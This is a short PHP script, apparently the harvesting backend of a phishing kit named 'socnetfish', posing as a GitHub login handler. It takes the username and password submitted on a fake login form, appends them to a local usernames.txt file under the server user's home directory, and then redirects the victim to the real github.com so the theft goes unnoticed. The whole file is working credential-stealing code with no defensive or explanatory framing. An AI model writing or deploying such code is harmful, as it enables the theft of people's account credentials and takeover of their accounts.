<?php
$usuario = exec('whoami');
file_put_contents("/home/". $usuario ."/.config/socnetfish/usernames.txt","\n" . "Github" . "\n" . "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com');
exit();
